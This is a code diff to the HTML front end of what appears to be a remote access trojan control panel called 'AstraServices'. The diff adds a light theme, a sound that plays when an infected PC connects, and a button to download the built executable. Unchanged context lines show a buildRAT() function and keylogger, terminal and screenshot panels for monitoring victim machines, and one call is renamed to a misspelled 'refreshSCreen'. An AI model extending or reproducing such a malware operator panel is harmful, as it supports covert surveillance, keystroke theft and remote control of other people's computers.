@@ -16,7 +16,7 @@
 
     <style>
         /* =====================================================
-           THEME VARIABLES
+           THEME VARIABLES - DARK (default)
         ===================================================== */
         :root {
             --bg-main: #09090b;
@@ -48,6 +48,32 @@
             --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
             --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
             --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+        }
+
+        /* =====================================================
+           THEME VARIABLES - LIGHT
+        ===================================================== */
+        [data-theme="light"] {
+            --bg-main: #f4f4f5;
+            --bg-panel: #ffffff;
+            --bg-card: #fafafa;
+            --bg-hover: #e4e4e7;
+            --bg-input: #ffffff;
+
+            --border-soft: #e4e4e7;
+            --border-active: #a1a1aa;
+
+            --text-main: #18181b;
+            --text-muted: #52525b;
+            --text-dim: #a1a1aa;
+
+            --accent: #18181b;
+            --accent-hover: #3f3f46;
+            --accent-glow: rgba(0, 0, 0, 0.05);
+
+            --shadow-sm: 0 1px 3px 0 rgb(0 0 0 / 0.08);
+            --shadow-md: 0 4px 12px -2px rgb(0 0 0 / 0.08);
+            --shadow-lg: 0 12px 24px -4px rgb(0 0 0 / 0.1);
         }
 
         /* =====================================================
@@ -545,6 +571,10 @@
 
 <body>
 
+    <audio id="notifSound" preload="auto" style="display:none">
+        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACAf39/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f39/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3=" type="audio/wav">
+    </audio>
+
     <div class="toast-container" id="toastContainer"></div>
 
     <div class="container">
@@ -557,6 +587,9 @@
                 Astra<span>Services</span>
             </h1>
             <div class="header-actions">
+                <button class="btn btn-secondary" id="themeToggle" onclick="toggleTheme()" title="Toggle theme">
+                    <span id="themeIcon">☀️</span>
+                </button>
                 <button class="btn btn-secondary" onclick="window.location.href='/logout'">LOGOUT</button>
             </div>
         </header>
@@ -598,6 +631,9 @@
                 <div style="padding: 16px; border-top: 1px solid var(--border-soft);">
                     <button id="buildBtn" class="btn btn-primary" style="width: 100%;" onclick="buildRAT()">
                         <span>BUILD PROGAM.EXE</span>
+                    </button>
+                    <button id="downloadBtn" class="btn btn-secondary" style="width: 100%; margin-top: 8px;" onclick="downloadEXE()">
+                        <span>DOWNLOAD LATEST .EXE</span>
                     </button>
                     <div id="buildOutput"
                         style="font-size: 11px; margin-top: 8px; text-align: center; color: var(--text-dim);"></div>
@@ -815,11 +851,54 @@
             document.getElementById('terminalOutput').textContent = '';
             document.getElementById('keyloggerOutput').textContent = '';
             document.getElementById('screenshotContainer').innerHTML = '<span style="color: #4b5563;">Loading screenshot...</span>';
-            refreshScreenshot(pcName);
+            refreshSCreen(pcName);
             refreshPCs();
         }
 
+        // ===================================
+        // THEME TOGGLE
+        // ===================================
+        function toggleTheme() {
+            const html = document.documentElement;
+            const icon = document.getElementById('themeIcon');
+            const current = html.getAttribute('data-theme');
+            const next = current === 'light' ? '' : 'light';
+            html.setAttribute('data-theme', next);
+            icon.textContent = next === 'light' ? '🌙' : '☀️';
+            localStorage.setItem('theme', next);
+        }
+
+        function loadTheme() {
+            const saved = localStorage.getItem('theme');
+            if (saved === 'light') {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.getElementById('themeIcon').textContent = '🌙';
+            } else {
+                document.getElementById('themeIcon').textContent = '☀️';
+            }
+        }
+
+        // ===================================
+        // SOUND NOTIFICATION
+        // ===================================
+        function playNotifSound() {
+            try {
+                const audio = document.getElementById('notifSound');
+                audio.currentTime = 0;
+                audio.volume = 0.5;
+                audio.play().catch(() => {});
+            } catch(e) {}
+        }
+
+        // ===================================
+        // DIRECT DOWNLOAD
+        // ===================================
+        function downloadEXE() {
+            window.open('/api/download', '_blank');
+        }
+
         window.onload = function () {
+            loadTheme();
             initWebSocket();
             refreshPCs();
             setInterval(refreshPCs, 5000);
@@ -850,6 +929,9 @@
             });
 
             socket.on('notification', (data) => {
+                if (data.type === 'success' && data.title === 'PC Conectado') {
+                    playNotifSound();
+                }
                 if (!data.pc_name || data.pc_name === selectedPC) {
                     showToast(data.type, data.message);
                 }
